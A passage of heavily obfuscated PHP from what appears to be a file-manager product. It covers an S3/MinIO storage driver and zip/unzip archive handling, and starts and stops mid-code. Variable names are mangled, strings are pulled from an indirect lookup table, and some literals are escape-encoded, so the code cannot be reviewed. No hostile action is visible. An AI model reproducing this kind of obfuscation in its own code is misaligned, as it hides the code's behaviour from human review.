($‡ôÕÊ“ == $œ–›ö‘) { continue; } $°şõûÔÇ = isset($ù©ô¸Ó[$çäõ¨ãÈ[76]]) ? $ù©ô¸Ó[$çäõ¨ãÈ[76]] : 0; $ùà¾Ë·Á = $°şõûÔÇ == 0 && substr($‡ôÕÊ“, strlen($‡ôÕÊ“) - 1, 1) == $çäõ¨ãÈ[8] ? !0 : !1; $this->cacheMethodInfoSet($‡ôÕÊ“, $ùà¾Ë·Á, $ù©ô¸Ó); if ($ùà¾Ë·Á) { $¤ğÒàÓ[] = $‡ôÕÊ“; continue; } $›¾ŸÅİÙ[] = $ùÄı™×¡ ? $ù©ô¸Ó : $‡ôÕÊ“; } foreach ($’Ü®–Êß[$çäõ¨ãÈ[205]] as $ù©ô¸Ó) { $¤ğÒàÓ[] = $ù©ô¸Ó[$çäõ¨ãÈ[32]]; $this->cacheMethodInfoSet($ù©ô¸Ó[$çäõ¨ãÈ[32]], !0); } $this->cacheMethodInfoSet($ìè©¨š, !0); return array($çäõ¨ãÈ[82] => $¤ğÒàÓ, $çäõ¨ãÈ[83] => $›¾ŸÅİÙ); } private function listObjs($ÅÆ°Ìüœ, $ÁÇÌõÏ = null, $ø­íï•˜ = null, $Ğ½¶‹¥´ = null) { $¬§Ë€’ =& $_SERVER[Îûáû“ş]; $ÅÆ°Ìüœ = trim($ÅÆ°Ìüœ, $¬§Ë€’[8]); $Óˆä²Šµ = empty($ÅÆ°Ìüœ) && $ÅÆ°Ìüœ !== $¬§Ë€’[198] ? $¬§Ë€’[12] : $ÅÆ°Ìüœ . $¬§Ë€’[8]; return $this->client->getBucket($this->bucket, $Óˆä²Šµ, $ÁÇÌõÏ, $ø­íï•˜, $Ğ½¶‹¥´, !0); } public function has($ìº©ç‹±, $ƒÃšº‰È = false, $ í²£æ = true) { $¿¾§±¤Õ =& $_SERVER[Îûáû“ş]; $ìº©ç‹± = trim($ìº©ç‹±, $¿¾§±¤Õ[8]); $Æ‹Îà©± = empty($ìº©ç‹±) && $ìº©ç‹± !== $¿¾§±¤Õ[198] ? $¿¾§±¤Õ[12] : $ìº©ç‹± . $¿¾§±¤Õ[8]; $’Ê›éÚÇ = null; $ñšşé¬ˆ = 500; $¯Ô¹ØŒ¨ = $¿¾§±¤Õ[8]; $ø„ø“Æû = $ùÆ¢ü× = array(); while (!0) { $ù²öâë÷ = $this->listObjs($ìº©ç‹±, $’Ê›éÚÇ, $ñšşé¬ˆ, $¯Ô¹ØŒ¨); if (!$ù²öâë÷) { break; } $’Ê›éÚÇ = $ù²öâë÷[$¿¾§±¤Õ[206]]; $™À‘öğí = $ù²öâë÷[$¿¾§±¤Õ[204]]; $™Ï¶Ãôñ = $ù²öâë÷[$¿¾§±¤Õ[205]]; if (empty($™À‘öğí) && empty($™Ï¶Ãôñ)) { break; } if (count($™À‘öğí) == 1 && $™À‘öğí[0][$¿¾§±¤Õ[32]] == $Æ‹Îà©±) { break; } if ($ƒÃšº‰È) { if (count($™À‘öğí)) { $™À‘öğí = array_column($™À‘öğí, $¿¾§±¤Õ[32]); $ø„ø“Æû = array_merge($ø„ø“Æû, $™À‘öğí); } if (count($™Ï¶Ãôñ)) { $™Ï¶Ãôñ = array_column($™Ï¶Ãôñ, $¿¾§±¤Õ[32]); $ùÆ¢ü× = array_merge($ùÆ¢ü×, $™Ï¶Ãôñ); } if ($’Ê›éÚÇ === null) { break; } continue; } if ($ í²£æ) { if (!empty($™À‘öğí)) { if (count($™À‘öğí) > 1 || isset($™À‘öğí[0][$¿¾§±¤Õ[32]]) && $™À‘öğí[0][$¿¾§±¤Õ[32]] != $Æ‹Îà©±) { return !0; } } } else { if (!empty($™Ï¶Ãôñ)) { return !0; } } if ($’Ê›éÚÇ === null) { break; } } if ($ƒÃšº‰È) { $ø„ø“Æû = array_diff($ø„ø“Æû, array($Æ‹Îà©±)); $ø„ø“Æû = count(array_unique($ø„ø“Æû)); $ùÆ¢ü× = count(array_unique($ùÆ¢ü×)); return array($¿¾§±¤Õ[207] => $ø„ø“Æû, $¿¾§±¤Õ[208] => $ùÆ¢ü×); } return !1; } public function listAll($ñÁ²ïè¹) { $Ì¥¬–ë =& $_SERVER[Îûáû“ş]; $ŞÆ º«ô = $this->fileList($ñÁ²ïè¹, $Ì¥¬–ë[12], !0); $…Ë¦¸ = array_to_keyvalue($ŞÆ º«ô[$Ì¥¬–ë[83]], $Ì¥¬–ë[32]); foreach ($ŞÆ º«ô[$Ì¥¬–ë[82]] as $Ëñİ“ø¾) { if (is_string($Ëñİ“ø¾)) { $…Ë¦¸[$Ëñİ“ø¾] = array($Ì¥¬–ë[76] => 0); } } return $this->listAllFiles($ñÁ²ïè¹, $…Ë¦¸); } public function canRead($ßúŒîÂ) { $óªÈòÚï =& $_SERVER[Îûáû“ş]; $ »Š¥¼¢ = $this->client->getAccessControlPolicy($this->bucket, $ßúŒîÂ); if (!$ »Š¥¼¢) { return !1; } return in_array($ »Š¥¼¢, array($óªÈòÚï[209], $óªÈòÚï[210], $óªÈòÚï[211])) ? !0 : !1; } public function canWrite($¾ş“Ùíà) { $ùÅ¹²¾÷ =& $_SERVER[Îûáû“ş]; $±©à¨â = $this->client->getAccessControlPolicy($this->bucket, $¾ş“Ùíà); if (!$±©à¨â) { return !1; } return in_array($±©à¨â, array($ùÅ¹²¾÷[209], $ùÅ¹²¾÷[210])) ? !0 : !1; } public function getContent($¢çµûáÍ) { return $this->client->getObject($this->bucket, $¢çµûáÍ); } public function setContent($–öÚÚà, $´÷ôµçæ = '', $¶•§…İÂ = false) { $‘™‚Æ–› =& $_SERVER[Îûáû“ş]; $–öÚÚà = $¶•§…İÂ ? trim($–öÚÚà, $‘™‚Æ–›[8]) . $‘™‚Æ–›[8] : $–öÚÚà; $÷±¦¡€  = get_file_mime(get_path_ext($–öÚÚà)); $¡„Ğ•Ì = $this->client->putObject($´÷ôµçæ, $this->bucket, $–öÚÚà, $‘™‚Æ–›[199], array(), $÷±¦¡€ ); if (!$¡„Ğ•Ì) { return !1; } if ($¶•§…İÂ) { return !0; } $this->cacheMethod(null, null); $¡„Ğ•Ì = $this->copyFile($–öÚÚà, $–öÚÚà, array($‘™‚Æ–›[212] => $¡„Ğ•Ì[$‘™‚Æ–›[213]])); return $¡„Ğ•Ì ? !0 : !1; } public function fileSubstr($ÊÒøÚ“ç, $œêí¶™, $Ûô¯Ò¦ˆ) { $¬ÆõéÑš = $œêí¶™ + $Ûô¯Ò¦ˆ - 1; return $this->client->getObject($this->bucket, $ÊÒøÚ“ç, array($_SERVER[Îûáû“ş][214] => "\x62\x79\164\x65\x73\75{$œêí¶™}\x2d{$¬ÆõéÑš}")); } public function upload($©±ƒ»™, $µÒ™úüá, $íüúÔå = false, $‘ê™––Ü = REPEAT_REPLACE) { $ƒ©Ø¹½µ =& $_SERVER[Îûáû“ş]; $¦×ËúÎ× = array($ƒ©Ø¹½µ[212] => @md5_file($µÒ™úüá)); $ş¬œèØÚ = array($ƒ©Ø¹½µ[215] => get_file_mime(get_path_ext($©±ƒ»™))); if (IO::size($µÒ™úüá) <= 1024 * 1024 * 200) { $¯ÚÏõÕ = $this->client->putObjectFile($µÒ™úüá, $this->bucket, $©±ƒ»™, $ƒ©Ø¹½µ[199], $¦×ËúÎ×, $ş¬œèØÚ); return !empty($¯ÚÏõÕ) ? $this->getPathOuter($©±ƒ»™) : !1; } $ƒ’î’Àû = $this->client->multiUploadObject($µÒ™úüá, $this->bucket, trim($©±ƒ»™, $ƒ©Ø¹½µ[8]), $¦×ËúÎ×, $ş¬œèØÚ); return $ƒ’î’Àû ? $this->getPathOuter($©±ƒ»™) : !1; } public function download($Ğ±¥Îì, $é£õĞ¥´) { if (!@is_dir($this->pathFather($é£õĞ¥´)) && !IO::mkdir($this->pathFather($é£õĞ¥´))) { return !1; } $üã®ñ£Ú = $this->client->getObject($this->bucket, $Ğ±¥Îì, array(), $é£õĞ¥´); return $üã®ñ£Ú !== !1 ? $é£õĞ¥´ : !1; } public function link($´Âú÷¶œ, $Ê“™Öç´ = array()) { $‰Ê—·ñ‰ =& $_SERVER[Îûáû“ş]; if ($this->signVer == $‰Ê—·ñ‰[216]) { return $this->client->getAuthenticatedURL($this->bucket, $´Âú÷¶œ, 3600 * 12, $Ê“™Öç´); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($´Âú÷¶œ, $‰Ê—·ñ‰[8]), 3600 * 12, $this->region, array(), !0, $Ê“™Öç´); } public function fileOut($¥ˆÒâìˆ, $èõ¯®âİ = false, $£ºŒÍË› = false, $”¾°ÆËŒ = '') { $ßº‘©•ä =& $_SERVER[Îûáû“ş]; if ($this->isFileOutServer()) { return $this->fileOutServer($¥ˆÒâìˆ, $èõ¯®âİ, $£ºŒÍË›, $”¾°ÆËŒ); } if (!$£ºŒÍË›) { $£ºŒÍË› = $this->pathThis($¥ˆÒâìˆ); } $™´€€·¸ = get_file_mime(get_path_ext($£ºŒÍË›)); if ($™´€€·¸ == $ßº‘©•ä[217]) { return parent::fileOut($¥ˆÒâìˆ, $èõ¯®âİ, $£ºŒÍË›, $”¾°ÆËŒ); } $ñ¢«îËë = array($ßº‘©•ä[218] => $™´€€·¸); if ($èõ¯®âİ) { $ñ¢«îËë[$ßº‘©•ä[219]] = $ßº‘©•ä[220] . rawurlencode($£ºŒÍË›); } else { } $·ùğö¬ = $this->link($¥ˆÒâìˆ, $ñ¢«îËë); $this->fileOutLink($·ùğö¬); } public function fileOutServer($ê‚”úöŠ, $è³«Šı˜ = false, $ğÜòŒÏÁ = false, $ğ†” = '') { parent::fileOut($ê‚”úöŠ, $è³«Šı˜, $ğÜòŒÏÁ, $ğ†”); } public function fileOutImageServer($¬ğĞÚ¥û, $®«Õã = 250) { parent::fileOutImage($¬ğĞÚ¥û, $®«Õã); } public function hashMd5($òÈ½Á¹, $·—Î³óÔ = '') { $ã”••°¢ =& $_SERVER[Îûáû“ş]; $øî½©“· = $this->objectMeta($òÈ½Á¹); if (!$øî½©“·) { return !1; } $·—Î³óÔ = $·—Î³óÔ ? $·—Î³óÔ : _get($øî½©“·, $ã”••°¢[221]); $·—Î³óÔ = $·—Î³óÔ ? $·—Î³óÔ : _get($øî½©“·, $ã”••°¢[213], $ã”••°¢[12]); return $·—Î³óÔ; } public function uploadFormData($É˜ªâÉ¥, $Ø«ÙÄªª = 3600) { $°ø¡Š¸è =& $_SERVER[Îûáû“ş]; $€”õßÂå = $this->pathFather($É˜ªâÉ¥); $²Éãßƒ = $this->client->getHttpUploadPostParams($this->bucket, $€”õßÂå, $°ø¡Š¸è[199], $Ø«ÙÄªª); return array_merge((array) $²Éãßƒ, array($°ø¡Š¸è[182] => $this->getHost())); } public function multiUploadFormData($áğ…ê¼, $¿‚“‰€œ = 3600) { $¦Åö‰¥¸ =& $_SERVER[Îûáû“ş]; $„İ”øßó = gmdate($¦Åö‰¥¸[222]); $–µÔ·à = array(); $ûàÍ„êÙ = $this->client->getUploadId($this->bucket, $áğ…ê¼, $–µÔ·à); if (!$ûàÍ„êÙ) { return !1; } return array($¦Åö‰¥¸[223] => $ûàÍ„êÙ, $¦Åö‰¥¸[182] => $this->getHost() . $¦Åö‰¥¸[8] . $this->pathEncode($áğ…ê¼), $¦Åö‰¥¸[224] => $„İ”øßó, $¦Åö‰¥¸[94] => $áğ…ê¼); } public function multiUploadAuthData($•ìƒù‡, $¬£Ó¡§© = array()) { $ÌÔ™¸àæ =& $_SERVER[Îûáû“ş]; $€½ÉŸí = isset($¬£Ó¡§©[$ÌÔ™¸àæ[224]]) ? $¬£Ó¡§©[$ÌÔ™¸àæ[224]] : gmdate($ÌÔ™¸àæ[222]); $Š°±©Ø = isset($¬£Ó¡§©[$ÌÔ™¸àæ[174]]) ? $¬£Ó¡§©[$ÌÔ™¸àæ[174]] : $ÌÔ™¸àæ[12]; $“ıÏ½ª¿ = $¬£Ó¡§©[$ÌÔ™¸àæ[94]]; unset($¬£Ó¡§©[$ÌÔ™¸àæ[94]]); if (isset($¬£Ó¡§©[$ÌÔ™¸àæ[225]])) { $¬£Ó¡§©[$ÌÔ™¸àæ[224]] = $€½ÉŸí; return $this->listUploadParts($“ıÏ½ª¿, $¬£Ó¡§©); } $¹¢óÄˆÈ = array($ÌÔ™¸àæ[226], $ÌÔ™¸àæ[12], $ÌÔ™¸àæ[120], $ÌÔ™¸àæ[12], "\170\55\x61\x6d\172\x2d\x64\141\x74\x65\x3a{$€½ÉŸí}", $ÌÔ™¸àæ[8] . $this->bucket . $ÌÔ™¸àæ[8] . $this->pathEncode($“ıÏ½ª¿) . $Š°±©Ø); if (strpos($Š°±©Ø, $ÌÔ™¸àæ[227]) === 0) { $¹¢óÄˆÈ[0] = $ÌÔ™¸àæ[228]; } if (isset($¬£Ó¡§©[$ÌÔ™¸àæ[229]]) && $¬£Ó¡§©[$ÌÔ™¸àæ[229]] == $ÌÔ™¸àæ[230]) { $¹¢óÄˆÈ[0] = $ÌÔ™¸àæ[230]; } $ˆÉâÈ™˜ = implode($ÌÔ™¸àæ[231], $¹¢óÄˆÈ); $ÅûâÒ ‡ = base64_encode(hash_hmac($ÌÔ™¸àæ[232], $ˆÉâÈ™˜, $this->secret, !0)); $”öÒ°œ• = $ÌÔ™¸àæ[233] . $this->accessKey . $ÌÔ™¸àæ[4] . $ÅûâÒ ‡; if (strpos($Š°±©Ø, $ÌÔ™¸àæ[227]) === 0) { return array($ÌÔ™¸àæ[234] => $”öÒ°œ•, $ÌÔ™¸àæ[224] => $€½ÉŸí); } return $”öÒ°œ•; } public function listUploadParts($•­¼ÎÃ, $‚²û‰¬˜ = array()) { $šŸ¹• =& $_SERVER[Îûáû“ş]; $Ùƒ¸˜ ” = str_replace($šŸ¹•[235], $šŸ¹•[12], $‚²û‰¬˜[$šŸ¹•[174]]); $ëÈÀèÜ§ = $this->client->listParts($this->bucket, $•­¼ÎÃ, $Ùƒ¸˜ ”); if (!$ëÈÀèÜ§) { return !1; } unset($‚²û‰¬˜[$šŸ¹•[225]], $‚²û‰¬˜[$šŸ¹•[229]]); $‚²û‰¬˜[$šŸ¹•[94]] = $•­¼ÎÃ; $Ï´ŠÃ± = $this->multiUploadAuthData($•­¼ÎÃ, $‚²û‰¬˜); if (empty($Ï´ŠÃ±)) { return !1; } return array($šŸ¹•[234] => $Ï´ŠÃ±, $šŸ¹•[224] => $‚²û‰¬˜[$šŸ¹•[224]], $šŸ¹•[236] => $ëÈÀèÜ§); } public function getHost() { return parent::getHost() . $_SERVER[Îûáû“ş][8] . $this->bucket; } public function size($Û­÷ã‹) { $¹Ä˜Ù”¬ = $this->objectMeta($Û­÷ã‹); return $¹Ä˜Ù”¬ ? $¹Ä˜Ù”¬[$_SERVER[Îûáû“ş][76]] : 0; } public function info($Š”Øßü) { if ($this->isFolder($Š”Øßü)) { return $this->folderInfo($Š”Øßü); } else { if ($this->isFile($Š”Øßü)) { return $this->fileInfo($Š”Øßü); } } return !1; } public function exist($şÙ£§ñÏ) { return $this->isFile($şÙ£§ñÏ) || $this->isFolder($şÙ£§ñÏ); } public function isFile($ÍÂ’Õ§¿) { return !$this->isFolder($ÍÂ’Õ§¿) && $this->objectMeta($ÍÂ’Õ§¿); } public function isFolder($’Ãİ´±) { return $this->cacheMethod($_SERVER[Îûáû“ş][165], $’Ãİ´±); } protected function objectMeta($›ø¸êúç) { return $this->cacheMethod($_SERVER[Îûáû“ş][167], $›ø¸êúç); } protected function _objectMeta($¼øÏ÷Âü) { $”«îı— =& $_SERVER[Îûáû“ş]; $¼øÏ÷Âü = rtrim($¼øÏ÷Âü, $”«îı—[8]); try { $“ÇöÆãÛ = $this->client->getObjectInfo($this->bucket, $¼øÏ÷Âü); if (!isset($“ÇöÆãÛ[$”«îı—[221]]) && isset($“ÇöÆãÛ[$”«îı—[237]])) { $“ÇöÆãÛ[$”«îı—[221]] = $“ÇöÆãÛ[$”«îı—[237]]; } } catch (Exception $’³’åœ§) { $“ÇöÆãÛ = !1; } if (!$“ÇöÆãÛ) { } return $“ÇöÆãÛ; } protected function _isFolder($×ê¡­¢) { $ï€ë½ƒ° =& $_SERVER[Îûáû“ş]; $×ê¡­¢ = rtrim($×ê¡­¢, $ï€ë½ƒ°[8]); if ($×ê¡­¢ == $ï€ë½ƒ°[12] || $×ê¡­¢ == $ï€ë½ƒ°[8]) { return !0; } $éù¤ÒŠŒ = $this->client->getBucket($this->bucket, $×ê¡­¢, null, 1); if (empty($éù¤ÒŠŒ[$ï€ë½ƒ°[204]])) { return !1; } $¥Éœ¨¢’ = $éù¤ÒŠŒ[$ï€ë½ƒ°[204]][0][$ï€ë½ƒ°[32]]; return stripos($¥Éœ¨¢’, $×ê¡­¢ . $ï€ë½ƒ°[8]) === 0 ? !0 : !1; if (substr($¥Éœ¨¢’, -1) == $ï€ë½ƒ°[8]) { return !0; } if (get_path_this($¥Éœ¨¢’) == get_path_this($×ê¡­¢)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¢ÇÏµ) { parent::__construct($¢ÇÏµ); $this->signatureVersion($_SERVER[Îûáû“ş][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto CÄ²‹”ó×É; F¾èâ—ò: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ƒÛ…ú‡—; if ($ƒÛ…ú‡—) { return $ƒÛ…ú‡—; } $ş ³ş¥¬ = IO::init($_SERVER[Îûáû“ş][8]); return $ş ³ş¥¬; } private static function iconvSystem($Æ‡Œ…) { return self::local()->iconvSystem($Æ‡Œ…); } private static function iconvApp($İÀ±ò¿†) { return self::local()->iconvApp($İÀ±ò¿†); } public static function zipFolder($”Üø×ûÖ, $ˆîÛªªœ = "\172\151\x70", $Ê­ëÉŸœ = '', $¾¿êºàÚ = REPEAT_RENAME) { $Œ¬Éı =& $_SERVER[Îûáû“ş]; $¯´¬Ã† = IO::listPath($”Üø×ûÖ); if (!$¯´¬Ã†) { return !1; } $¯´¬Ã† = array_merge($¯´¬Ã†[$Œ¬Éı[82]], $¯´¬Ã†[$Œ¬Éı[83]]); return self::zip($¯´¬Ã†, $ˆîÛªªœ, $Ê­ëÉŸœ, $¾¿êºàÚ); } public static function zip($Š¨šîıü, $æ¼ò±¹Ì = "\x7a\x69\x70", $®áìàà = '', $êÈìåŸñ = REPEAT_RENAME) { $Â­ûæ®» =& $_SERVER[Îûáû“ş]; if (is_string($Š¨šîıü) && $Š¨šîıü) { $Š¨šîıü = array(array($Â­ûæ®»[84] => $Š¨šîıü)); } $ŒßµØº¹ = self::init($Š¨šîıü[0][$Â­ûæ®»[84]]); $¹Óøûµ¿ = self::info($Š¨šîıü[0][$Â­ûæ®»[84]]); $€ïŸãÇŠ = $Â­ûæ®»[12]; $¥À¦½­ = $Â­ûæ®»[12]; $Ã©ˆ¿ì = $Â­ûæ®»[12]; if ($®áìàà && substr($®áìàà, -1, 1) != $Â­ûæ®»[8]) { $¥À¦½­ = get_path_father($®áìàà); $Ã©ˆ¿ì = get_path_this($®áìàà); } else { $¥À¦½­ = self::pathFather($¹Óøûµ¿[$Â­ûæ®»[84]]); $Ã©ˆ¿ì = $¹Óøûµ¿[$Â­ûæ®»[32]] . $Â­ûæ®»[10] . $æ¼ò±¹Ì; if (count($Š¨šîıü) > 1) { $ƒµ‹şÈ = IO::info($¥À¦½­); $Ã©ˆ¿ì = $ƒµ‹şÈ[$Â­ûæ®»[32]] . $Â­ûæ®»[10] . $æ¼ò±¹Ì; } if ($®áìàà) { $¥À¦½­ = $®áìàà; } } if ($ŒßµØº¹->getType() == $Â­ûæ®»[106]) { $ïêö«Ú² = self::init($¥À¦½­); $ÌÏËáºé = $ïêö«Ú²->getType() == $Â­ûæ®»[106] ? $¥À¦½­ : get_path_father($ŒßµØº¹->path); $ÌÏËáºé = rtrim($ÌÏËáºé, $Â­ûæ®»[8]) . $Â­ûæ®»[8]; mk_dir($ÌÏËáºé); } else { $€ïŸãÇŠ = TEMP_FILES . $Â­ûæ®»[1185] . time() . rand_string(8) . $Â­ûæ®»[8]; mk_dir($€ïŸãÇŠ); file_put_contents($€ïŸãÇŠ . $Â­ûæ®»[1186], $Â­ûæ®»[12]); $ÌÏËáºé = $€ïŸãÇŠ; } $œæ³ñÙ = IO::info($ÌÏËáºé); if (!$œæ³ñÙ || !$œæ³ñÙ[$Â­ûæ®»[203]]) { show_json(LNG($Â­ûæ®»[1187]), !1); } $âíÅå¨Ó = self::zipFileList($Š¨šîıü, $€ïŸãÇŠ); foreach ($âíÅå¨Ó as $Ş›Œ»Í => $™ú½¹) { $âíÅå¨Ó[$Ş›Œ»Í] = self::iconvSystem($™ú½¹); } $¬®²Ö£ô = get_filename_auto($ÌÏËáºé . $Ã©ˆ¿ì, $Â­ûæ®»[12], $êÈìåŸñ); KodArchive::create(self::iconvSystem($¬®²Ö£ô), $âíÅå¨Ó); if (!IO::exist($¬®²Ö£ô)) { if ($€ïŸãÇŠ) { del_dir($€ïŸãÇŠ); } show_json(LNG($Â­ûæ®»[1188]), !1); } if (!$€ïŸãÇŠ) { return $¬®²Ö£ô; } $åË¯š÷ = self::move($¬®²Ö£ô, $¥À¦½­, $êÈìåŸñ); if ($€ïŸãÇŠ) { del_dir($€ïŸãÇŠ); } if (!$¬®²Ö£ô) { show_json(LNG($Â­ûæ®»[1188]), !1); } return $åË¯š÷; } public static function unzip($¹Ã¬€œ, $êÎéš°, $Á»˜âÎ = "\x2d\x31", $ãĞ“º˜ = "\162\145\x70\x6c\x61\x63\145") { $„ç ©É¡ =& $_SERVER[Îûáû“ş]; $ö²µğ¯Ä = parent::info($¹Ã¬€œ); if (!$ö²µğ¯Ä) { show_json(LNG($„ç ©É¡[1189]), !1); } $šŠÑ–‚Á = IO::infoFull($êÎéš°); if (!$šŠÑ–‚Á) { $êÎéš° = IO::mkdir($êÎéš°); } if (isset($šŠÑ–‚Á[$„ç ©É¡[402]]) && trim($šŠÑ–‚Á[$„ç ©É¡[84]], $„ç ©É¡[8]) != trim($êÎéš°, $„ç ©É¡[8])) { $ÃæÁ¢ƒ = KodIO::make($šŠÑ–‚Á[$„ç ©É¡[432]]); $ªÈšŠ¨ô = IO::fileNameAuto($ÃæÁ¢ƒ, $šŠÑ–‚Á[$„ç ©É¡[32]], REPEAT_RENAME_FOLDER, !0); $êÎéš° = IO::mkdir($ÃæÁ¢ƒ . $ªÈšŠ¨ô); } $Á»˜âÎ = $Á»˜âÎ && $Á»˜âÎ != $„ç ©É¡[1190] ? @json_decode($Á»˜âÎ, !0) : -1; $ÅË˜Å¹Ş = self::unzipPart($¹Ã¬€œ, $Á»˜âÎ); if (!$ÅË˜Å¹Ş || !IO::exist($ÅË˜Å¹Ş[$„ç ©É¡[200]])) { show_json(LNG($„ç ©É¡[105]), !1); } $áİÙ„ï™ = $ÅË˜Å¹Ş[$„ç ©É¡[1191]][count($ÅË˜Å¹Ş[$„ç ©É¡[1191]]) - 1]; if ($áİÙ„ï™[$„ç ©É¡[1192]] == -1 || substr($áİÙ„ï™[$„ç ©É¡[32]], -1, 1) == $„ç ©É¡[8]) { $®ŞÙš„¤ = $ÅË˜Å¹Ş[$„ç ©É¡[1193]] . rand_string(10) . $„ç ©É¡[8]; mk_dir($®ŞÙš„¤); $€”„‰­ƒ = count($ÅË˜Å¹Ş[$„ç ©É¡[1191]]) == 1 ? IO::ext($¹Ã¬€œ) : get_path_ext($ÅË˜Å¹Ş[$„ç ©É¡[200]]); $Ã¥ê”§Î = KodArchive::extract(self::iconvSystem($ÅË˜Å¹Ş[$„ç ©É¡[200]]), $®ŞÙš„¤, $áİÙ„ï™[$„ç ©É¡[1192]], $ªÈšŠ¨ô, $€”„‰­ƒ); self::unzipErrorCheck($Ã¥ê”§Î, array($„ç ©É¡[1194], $¹Ã¬€œ, $€”„‰­ƒ, $êÎéš°, $ÅË˜Å¹Ş)); Hook::trigger($„ç ©É¡[1195], $®ŞÙš„¤); recursion_dir($®ŞÙš„¤, $Õ’öëö, $¦õ„°Ê, 0); $˜ó­š„î = array_merge($Õ’öëö, $¦õ„°Ê); $¹ÂÖÃİ£ = array(); foreach ($˜ó­š„î as $æ¯ÃíªÓ) { $÷ú•ìø = IO::move(self::iconvApp($æ¯ÃíªÓ), $êÎéš°, $ãĞ“º˜); if ($÷ú•ìø) { $¹ÂÖÃİ£[] = $÷ú•ìø; } } del_dir($®ŞÙš„¤); } else { $÷ú•ìø = IO::move($ÅË˜Å¹Ş[$„ç ©É¡[200]], $êÎéš°, $ãĞ“º˜, get_path_this($áİÙ„ï™[$„ç ©É¡[32]])); if ($÷ú•ìø) { $¹ÂÖÃİ£[] = $÷ú•ìø; } } return $¹ÂÖÃİ£ ? $¹ÂÖÃİ£ : !1; } public static function unzipList($è•ééì©) { $Î”ù÷­Ê =& $_SERVER[Îûáû“ş]; $÷ãö­³ = isset($è•ééì©[$Î”ù÷­Ê[1196]]) ? $è•ééì©[$Î”ù÷­Ê[1196]] : !1; $‘Ü¦¥«ğ = isset($è•ééì©[$Î”ù÷­Ê[1192]]) ? @json_decode($è•ééì©[$Î”ù÷­Ê[1192]], !0) : -1; $¼ÓÙÉªÇ = self::unzipPart($è•ééì©[$Î”ù÷­Ê[84]], $‘Ü¦¥«ğ); if (!$¼ÓÙÉªÇ || !IO::exist($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]])) { show_json(LNG($Î”ù÷­Ê[105]), !1); } $ÑÉ»İ„ = $¼ÓÙÉªÇ[$Î”ù÷­Ê[1191]][count($¼ÓÙÉªÇ[$Î”ù÷­Ê[1191]]) - 1]; $È¢çÎŠë = in_array(IO::ext($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]]), array($Î”ù÷­Ê[313], $Î”ù÷­Ê[1197], $Î”ù÷­Ê[1198], $Î”ù÷­Ê[1199], $Î”ù÷­Ê[1200], $Î”ù÷­Ê[1201])); if (!$÷ãö­³ && ($ÑÉ»İ„[$Î”ù÷­Ê[1192]] == -1 || $È¢çÎŠë)) { $ÛíƒÒÍ» = $¼ÓÙÉªÇ[$Î”ù÷­Ê[1193]] . get_path_this($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]]) . $Î”ù÷­Ê[1202]; if (!IO::exist($ÛíƒÒÍ»)) { $Ù±Õ”Û× = $ÑÉ»İ„[$Î”ù÷­Ê[1192]] == -1 ? get_path_ext(IO::pathThis($è•ééì©[$Î”ù÷­Ê[84]])) : get_path_ext($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]]); $Å­’ß§ç = KodArchive::listContent(self::iconvSystem($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]]), !0, $Ù±Õ”Û×); self::unzipErrorCheck($Å­’ß§ç, array($Î”ù÷­Ê[1203], $è•ééì©, $¼ÓÙÉªÇ)); @file_put_contents($ÛíƒÒÍ», json_encode($Å­’ß§ç[$Î”ù÷­Ê[1204]])); } return @json_decode(IO::getContent($ÛíƒÒÍ»), !0); } IO::fileOut($¼ÓÙÉªÇ[$Î”ù÷­Ê[200]], $÷ãö­³, get_path_this($ÑÉ»İ„[$Î”ù÷­Ê[32]])); die; } private static function zipFileList($ÒÄÀ‡´³, $¦÷Üúùà = false) { $Äó¨…ß‹ =& $_SERVER[Îûáû“ş]; $†Úûø«Ï = array(); foreach ($ÒÄÀ‡´³ as $ì£ô­É¾) { $ñó´§â¤ = $ì£ô­É¾[$Äó¨…ß‹[84]]; if ($¦÷Üúùà) { $ñó´§â¤ = self::copy($ì£ô­É¾[$Äó¨…ß‹[84]], $¦÷Üúùà, $Äó¨…ß‹[817]); } else { $âš×Œ÷Ï = self::init($ì£ô­É¾[$Äó¨…ß‹[84]]); if ($âš×Œ÷Ï->getType() == $Äó¨…ß‹[106]) { $ñó´§â¤ = $âš×Œ÷Ï->path; } } if ($ñó´§â¤ && self::local()->exist($ñó´§â¤)) { $†Úûø«Ï[$ì£ô­É¾[$Äó¨…ß‹[84]]] = $ñó´§â¤; } } if (!empty($†Úûø«Ï)) { return array_values($†Úûø«Ï); } show_json(LNG($Äó¨…ß‹[1167]), !1); } private static function localFilePath($ëìŞùâİ) { $Úš¨Ê¬Ä =& $_SERVER[Îûáû“ş]; $ô¼Á¨ˆ = KodIO::parse($ëìŞùâİ); if ($ô¼Á¨ˆ[$Úš¨Ê¬Ä[33]] == KodIO::KOD_SOURCE) { $¸æµÑÎ„ = Model($Úš¨Ê¬Ä[824])->fileInfoGet(KodIO::sourceID($ëìŞùâİ)); if (!$¸æµÑÎ„[$Úš¨Ê¬Ä[84]]) { show_json($Úš¨Ê¬Ä[1205], !1); } $ëìŞùâİ = $¸æµÑÎ„[$Úš¨Ê¬Ä[84]]; } $çëáÃö­ = self::init($ëìŞùâİ); if ($çëáÃö­->pathParse[$Úš¨Ê¬Ä[1153]]) { $ëìŞùâİ = $çëáÃö­->pathParse[$Úš¨Ê¬Ä[1153]]; $çëáÃö­ = self::init($ëìŞùâİ); } $Ôó£ÀîĞ = $çëáÃö­->getType(); if ($Ôó£ÀîĞ == $Úš¨Ê¬Ä[106] || $Ôó£ÀîĞ == $Úš¨Ê¬Ä[1206]) { if (!$çëáÃö­->exist($çëáÃö­->path)) { show_json(LNG($Úš¨Ê¬Ä[105]), !1); } return $çëáÃö­->path; } return !1; } public static function unzipPart($ÜğÖîÛ­, $¦¿·¬— = -1) { $¿úÕøœ– =& $_SERVER[Îûáû“ş]; $Á´ßÀ’ = IO::pathThis($ÜğÖîÛ­); if (!$¦¿·¬— || $¦¿·¬— == -1) { $×ó„û¹£ = array(array($¿úÕøœ–[32] => $Á´ßÀ’, $¿úÕøœ–[1192] => -1)); $×ó„û¹£[0][$¿úÕøœ–[1207]] = 